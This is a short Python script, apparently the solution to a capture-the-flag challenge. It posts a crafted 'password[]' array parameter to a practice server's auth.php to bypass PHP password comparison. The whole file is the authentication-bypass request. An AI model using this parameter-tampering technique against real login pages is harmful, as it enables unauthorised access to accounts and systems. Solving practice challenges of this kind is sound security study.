from urllib import request, parse

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
data = parse.urlencode({'password[]': 'foo'}).encode('ascii')

with request.urlopen(url, data) as response:
    print(response.read().decode('utf-8'))
